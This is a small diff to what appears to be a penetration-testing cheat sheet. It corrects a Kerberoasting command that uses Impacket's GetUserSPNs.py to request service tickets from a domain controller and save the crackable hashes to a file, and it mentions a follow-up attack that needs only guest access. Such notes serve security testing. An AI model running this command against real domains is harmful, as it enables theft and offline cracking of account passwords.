@@ -5,7 +5,7 @@
 The attack:
 
 ```bash
-GetUserSPNs DOMAIN/USER:PASSWORD@DC_IP {-dc-ip} DC_IP -request -outputfile kerb.hashcat
+GetUserSPNs.py DOMAIN/USER:PASSWORD@DC_IP {-dc-ip} DC_IP -request -outputfile kerb.hashcat
 ```
 
 If you have guest access with no password, and you have a list of users, this attack might work:
